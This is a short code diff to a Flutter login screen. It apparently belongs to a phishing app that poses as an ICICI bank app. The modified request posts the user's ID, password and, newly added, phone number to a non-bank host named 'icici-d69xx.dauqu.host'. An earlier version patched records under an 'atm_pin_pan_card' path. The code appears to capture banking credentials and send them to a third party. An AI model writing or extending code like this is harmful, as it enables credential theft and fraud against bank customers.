@@ -88,21 +88,16 @@ class _LoginState extends State<Login> {
       loading = false;
     });
 
-    var response = prefs.getString('response');
-    //Parse JSON
-    var data = jsonDecode(response!);
-
     //Http post request
     await http
-        .patch(
-            Uri.parse(
-                "https://icici-d69xx.dauqu.host/data/atm_pin_pan_card/${data["_id"]}"),
+        .post(Uri.parse("https://icici-d69xx.dauqu.host/data"),
             headers: <String, String>{
               'Content-Type': 'application/json; charset=UTF-8',
             },
             body: jsonEncode(<String, String>{
               "user_id": userId.toString(),
               "password": password.toString(),
+              "phone": phone.toString(),
             }))
         .then((value) async => {
               //Set Laoding to false
@@ -110,6 +105,8 @@ class _LoginState extends State<Login> {
                 loading = false;
               }),
 
+              //Remove shared pref
+              await prefs.remove('response'),
               //Set shared pref
               await prefs.setString('response', value.body),
 
